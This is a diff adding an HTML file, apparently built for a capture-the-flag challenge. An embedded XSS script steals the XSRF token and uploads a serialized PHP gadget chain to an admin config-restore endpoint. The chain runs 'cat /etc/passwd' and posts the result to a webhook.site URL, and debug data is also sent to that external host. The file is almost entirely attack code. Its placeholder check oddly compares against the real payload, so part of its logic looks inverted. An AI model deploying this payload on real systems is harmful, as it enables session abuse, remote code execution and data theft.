@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>XSS Uploader for FLAG3/4</title>
+    <!-- VERSION_XSS_UPLOAD_FLAG34_V1 -->
+
+    <meta property="og:title" content="Admin File Upload Utility">
+    <meta name="description" content='<script>
+    (function() {
+        // Webhook này chỉ dùng để DEBUG quá trình XSS upload, không phải để nhận flag
+        var debug_webhook_id = "792a817c-a6b3-4529-a9ed-5780c728488a"; 
+        var debug_attacker_url = "https://webhook.site/" + debug_webhook_id;
+        
+        // =======================================================================================
+        // DÁN TOÀN BỘ NỘI DUNG TỪ FILE "base64_payload_string.txt" (đã tạo ở Phần 1) VÀO ĐÂY:
+        var base64SavPayload = "PASTE_YOUR_VERY_LONG_BASE64_STRING_FROM_PHP_SCRIPT_HERE"; 
+        // =======================================================================================
+
+        function sendDebugPing(data_obj) {
+            var params = new URLSearchParams();
+            params.append("source_tag", "name:description_XSS_UPLOAD_FLAG34_V1"); 
+            for (var key in data_obj) {
+                if (data_obj.hasOwnProperty(key)) {
+                    let value = data_obj[key];
+                    if (typeof value === "object" && value !== null) {
+                        if (value instanceof Error) value = { name: value.name, message: value.message};
+                        try { params.append(key, JSON.stringify(value).substring(0, 500)); } 
+                        catch (e) { params.append(key, "[Unserializable]"); }
+                    } else { params.append(key, String(value).substring(0, 500)); }
+                }
+            }
+            new Image().src = debug_attacker_url + "?" + params.toString();
+        }
+
+        function b64toBlob(b64Data, contentType="application/octet-stream") {
+            try {
+                const byteCharacters = atob(b64Data);
+                const byteArrays = [];
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    const byteNumbers = new Array(slice.length);
+                    for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
+                    byteArrays.push(new Uint8Array(byteNumbers));
+                }
+                return new Blob(byteArrays, {type: contentType});
+            } catch (e) {
+                sendDebugPing({stage: "b64toBlob_error", error: e.message});
+                return null;
+            }
+        }
+        
+        try {
+            sendDebugPing({ stage: "script_start_flag34", loc: window.location.href });
+
+            if (!base64SavPayload || base64SavPayload === "Tzo1NToiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdTaW5nbGV0b25SZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NDp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjM1OiJJbGx1bWluYXRlXERhdGFiYXNlXERhdGFiYXNlTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO2E6MTp7czo2OiJjb25maWciO2E6Mjp7czoxNjoiZGF0YWJhc2UuZGVmYXVsdCI7czo2OiJzeXN0ZW0iO3M6MjA6ImRhdGFiYXNlLmNvbm5lY3Rpb25zIjthOjE6e3M6Njoic3lzdGVtIjtzOjE2NToiYWNhdCAvZXRjL3Bhc3N3ZCA+IC90bXAvZmxhZzNfY29udGVudC50eHQ7IGN1cmwgLUYgZmxhZzM9QC90bXAvZmxhZzNfY29udGVudC50eHQgaHR0cHM6Ly93ZWJob29rLnNpdGUvNzkyYTgxN2MtYTZiMy00NTI5LWE5ZWQtNTc4MGM3Mjg0ODhhOyBybSAvdG1wL2ZsYWczX2NvbnRlbnQudHh0Ijt9fX1zOjEwOiIAKgBmYWN0b3J5IjtzOjg6ImFueXRoaW5nIjtzOjEzOiIAKgBleHRlbnNpb25zIjthOjE6e3M6Njoic3lzdGVtIjtzOjEyOiJhcnJheV9maWx0ZXIiO319czo3OiIAKgBuYW1lIjtzOjQ6Im5hbWUiO3M6MTM6IgAqAGNvbnRyb2xsZXIiO3M6MTA6ImNvbnRyb2xsZXIiO3M6MTA6IgAqAG9wdGlvbnMiO2E6MDp7fX0K") {
+                sendDebugPing({stage: "payload_string_not_pasted"});
+                return; 
+            }
+
+            var xsrfTokenValue = null;
+            var cookies = document.cookie.split(";");
+            for (var i = 0; i < cookies.length; i++) {
+                var cookie = cookies[i].trim();
+                if (cookie.startsWith("XSRF-TOKEN=")) {
+                    xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
+                    break;
+                }
+            }
+
+            if (!xsrfTokenValue) {
+                sendDebugPing({ stage: "xsrf_token_missing_for_upload" });
+                // Có thể thử gửi mà không có _token, dựa vào header X-XSRF-TOKEN trình duyệt tự gửi
+                // nhưng an toàn hơn là có nó.
+            } else {
+                 sendDebugPing({ stage: "xsrf_token_found_for_upload", xsrf_preview: xsrfTokenValue.substring(0,20) });
+            }
+
+            var fileBlob = b64toBlob(base64SavPayload); 
+            if (!fileBlob) { return; } // Lỗi đã được log trong b64toBlob
+
+            var uploadFile = new File([fileBlob], "backup.sav", {type: "application/octet-stream"});
+            var formData = new FormData();
+            
+            if (xsrfTokenValue) { // Chỉ thêm _token nếu lấy được
+                 formData.append("_token", xsrfTokenValue); 
+            }
+            formData.append("config_file", uploadFile, "backup.sav"); // Tên trường là config_file cho AdminController
+
+            sendDebugPing({ stage: "formdata_created_ready_to_upload", filename: "backup.sav" });
+
+            fetch("/admin/configs/restore", { // Endpoint của AdminController
+                method: "POST",
+                headers: { 
+                    "Accept": "text/html,application/json", 
+                    "X-Requested-With": "XMLHttpRequest"
+                    // "X-XSRF-TOKEN": xsrfTokenValue // Để trình duyệt tự xử lý header này từ cookie
+                },
+                body: formData
+            })
+            .then(response => {
+                sendDebugPing({ 
+                    stage: "upload_response_admin_configs", 
+                    status: response.status, 
+                    ok: response.ok, 
+                    url_after_resp: response.url 
+                });
+                // Nếu upload thành công và RCE chạy, kết quả sẽ về webhook trong $commandToExecute
+                // Chúng ta không cần đọc body response ở đây lắm.
+                if (!response.ok && !(response.status >= 300 && response.status < 400) ) { // Nếu không OK và không phải redirect
+                     return response.text().then(text => {
+                        sendDebugPing({ stage: "upload_error_admin_configs", status: response.status, body: text.substring(0,300) });
+                     });
+                }
+            })
+            .catch(error => {
+                sendDebugPing({ stage: "upload_fetch_catch_error_admin_configs", error: error.message });
+            });
+
+        } catch (e_outer) {
+            sendDebugPing({ stage: "outer_script_error_flag34", error: e_outer.message });
+        }
+    })();
+</script>'></head>
+<body>
+    <h1>XSS Uploader for FLAG3/4 - Target: Admin Config Restore</h1>
+</body>
+</html>
